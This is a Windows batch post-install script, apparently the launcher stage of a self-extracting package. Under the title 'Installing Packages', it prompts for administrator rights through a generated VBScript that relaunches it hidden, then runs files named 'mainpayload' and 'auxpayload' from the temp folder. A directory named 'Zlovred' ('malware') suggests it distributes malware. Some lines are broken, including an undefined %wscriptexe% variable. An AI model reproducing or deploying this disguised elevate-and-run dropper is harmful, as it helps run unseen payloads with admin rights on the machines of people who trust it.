@echo off
rem *******************************************************
rem postinstall.run.cmd
rem This File will Run Main and Aux Payloads
rem after Decompression the File
rem *******************************************************
@echo off

rem Set a Variables...
rem


rem Set Files and Directories
rem
set pathCMD=%SystemRoot%\System32
set WorkingDir=%TEMP%\mainexample.7

set mainpayload=%WorkingDir%\mainpayload.run.cmd
set auxpayload=%WorkingDir%\auxpayload.run.cmd

rem set TPDL variable
rem
if exist "C:\pub1\Distrib\Zlovred" set TPDL=C:\pub1\Distrib\Zlovred&& goto TPDL_End
set TPDL=%TEMP%
:TPDL_End

rem echo Download and Run Payload..
rem
title Installing Packages
::-------------------------------------
REM  --> CheckING for permissions
net session >nul 2>&1

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
rem Lock Data
rem exit /b 17
rem
set getadminvbs=nit-%~n0.vbs
    echo Set UAC = CreateObject^("Shell.Application"^) > "%TPDL%\%getadminvbs%"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 0 >> "%TPDL%\%getadminvbs%"

    %wscriptexe% "%TPDL%\%getadminvbs%"
    del "%TPDL%\%getadminvbs%"
    exit /B 0

:gotAdmin
echo Run as Admin...

%COMSPEC% /c %auxpayload%
call %mainpayload%

:End
exit /b 0
